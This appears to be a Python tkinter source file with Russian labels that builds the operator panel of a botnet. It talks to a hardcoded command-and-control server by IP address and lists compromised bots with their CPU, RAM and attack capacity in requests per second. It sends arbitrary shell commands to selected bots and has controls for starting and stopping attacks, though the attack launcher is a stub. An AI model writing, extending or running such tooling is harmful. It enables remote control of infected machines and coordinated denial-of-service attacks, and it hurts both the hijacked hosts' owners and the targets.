import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import socket
import json
import time

class BotnetTab(tk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent, bg="#f0f0f0")
        self.app = app
        self.c2_host = "80.249.146.202"
        self.c2_port = 80
        self.colors = {
            "bg": "#f0f0f0", "fg": "#000000", "button_bg": "#d9d9d9",
            "entry_bg": "#ffffff", "tree_bg": "#ffffff", "tree_fg": "#000000",
            "tree_sel": "#3399ff"
        }
        self.bots = {}
        self.refreshing = False
        self.auto_refresh = None
        self.create_widgets()
        self.after(5000, self._auto_refresh)  # автоматическое обновление

    def create_widgets(self):
        ctrl_frame = tk.Frame(self, bg=self.colors["bg"])
        ctrl_frame.pack(fill=tk.X, padx=5, pady=5)

        tk.Button(ctrl_frame, text="Обновить список", command=self.refresh_bots,
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
        tk.Button(ctrl_frame, text="Массовая команда", command=self.show_cmd_dialog,
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
        tk.Button(ctrl_frame, text="Остановить все атаки", command=self.stop_all_attacks,
                  bg=self.colors["button_bg"], fg="red").pack(side=tk.LEFT, padx=2)
        tk.Button(ctrl_frame, text="Запустить атаку на выделенных", command=self.launch_attack_on_selected,
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)

        # Таблица ботов
        tree_frame = tk.Frame(self, bg=self.colors["bg"])
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        columns = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.tree.heading(col, text=col.capitalize())
            self.tree.column(col, width=100, anchor="center")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Статистика
        stat_frame = tk.Frame(self, bg=self.colors["bg"])
        stat_frame.pack(fill=tk.X, padx=5, pady=5)
        self.lbl_total = tk.Label(stat_frame, text="Всего: 0", bg=self.colors["bg"])
        self.lbl_total.pack(side=tk.LEFT, padx=10)
        self.lbl_online = tk.Label(stat_frame, text="Онлайн: 0", bg=self.colors["bg"])
        self.lbl_online.pack(side=tk.LEFT, padx=10)
        self.lbl_power = tk.Label(stat_frame, text="Суммарная мощность: 0 RPS", bg=self.colors["bg"])
        self.lbl_power.pack(side=tk.LEFT, padx=10)

        # Панель выполнения команд
        cmd_frame = tk.LabelFrame(self, text="Выполнить команду на ботах", bg=self.colors["bg"], fg="black")
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        self.cmd_entry = tk.Entry(cmd_frame, width=50)
        self.cmd_entry.pack(side=tk.LEFT, padx=5, pady=5)
        tk.Button(cmd_frame, text="Отправить", command=self.send_command, bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
        tk.Button(cmd_frame, text="Очистить вывод", command=lambda: self.output_text.delete(1.0, tk.END),
                  bg=self.colors["button_bg"]).pack(side=tk.LEFT, padx=2)
        self.output_text = scrolledtext.ScrolledText(cmd_frame, height=8, bg="white")
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def _auto_refresh(self):
        self.refresh_bots()
        self.after(5000, self._auto_refresh)  # каждые 5 секунд

    def refresh_bots(self):
        threading.Thread(target=self._fetch_bots, daemon=True).start()

    def _fetch_bots(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(b"list")
            data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            sock.close()
            bots = json.loads(data)
            # Сохраняем в self.bots для использования
            self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
            self._update_tree(bots)
        except Exception as e:
            print(f"[BotnetTab] Ошибка обновления: {e}")

    def _update_tree(self, bots):
        self.tree.delete(*self.tree.get_children())
        total = len(bots)
        online = 0
        total_rps = 0
        for bot in bots:
            if bot.get("ip") == "77.79.168.92":
                continue
            values = (
                bot.get("ip", ""),
                bot.get("hostname", ""),
                bot.get("os", ""),
                bot.get("cpu", ""),
                bot.get("ram", ""),
                bot.get("status", "offline"),
                bot.get("rps", 0),
                bot.get("last_seen", "")
            )
            self.tree.insert("", "end", values=values)
            if bot.get("status") == "online":
                online += 1
            total_rps += int(bot.get("rps", 0))
        self.lbl_total.config(text=f"Всего: {total}")
        self.lbl_online.config(text=f"Онлайн: {online}")
        self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")

    def send_command(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите хотя бы одного бота")
            return
        command = self.cmd_entry.get().strip()
        if not command:
            messagebox.showwarning("Ошибка", "Введите команду")
            return
        bots = [self.tree.item(i, "values")[0] for i in selected]
        threading.Thread(target=self._execute_on_bots, args=(bots, command), daemon=True).start()

    def _execute_on_bots(self, bots, command):
        for ip in bots:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.c2_host, self.c2_port))
                msg = json.dumps({"cmd": "exec", "bot_ip": ip, "payload": command})
                sock.send(msg.encode())
                sock.close()
                self.output_text.insert(tk.END, f"[OK] {ip}\n")
            except Exception as e:
                self.output_text.insert(tk.END, f"[FAIL] {ip}: {e}\n")
            self.output_text.see(tk.END)

    def stop_all_attacks(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(b"stop_all")
            sock.close()
            messagebox.showinfo("Успех", "Команда остановки отправлена")
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось остановить атаки: {e}")

    def launch_attack_on_selected(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов для атаки")
            return
        # Заглушка: в реальности нужно открыть окно настройки атаки
        messagebox.showinfo("Атака", f"Выбрано {len(selected)} ботов. Функция в разработке.")

    def show_cmd_dialog(self):
        self.cmd_entry.focus_set()